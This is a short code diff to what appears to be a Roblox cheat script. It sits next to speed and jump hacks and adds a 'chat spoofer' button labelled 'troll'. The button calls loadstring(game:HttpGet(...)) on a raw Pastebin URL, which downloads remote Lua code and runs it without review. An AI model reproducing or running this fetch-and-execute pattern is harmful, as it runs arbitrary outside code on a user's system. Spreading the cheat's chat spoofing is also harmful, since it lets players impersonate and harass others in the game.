@@ -41,3 +41,12 @@ PlayerSection:NewButton("Reset speed and jump", "resets speed and jump", functio
     game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
     game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
 end)
+
+--other
+local Player = Window:NewTab("chat")
+local OtherSection = Player:NewSection("chat")
+
+
+OtherSection:NewButton("chat spoofer", "troll", function()
+    loadstring(game:HttpGet(('https://pastebin.com/raw/djBfk8Li'),true))
+end)
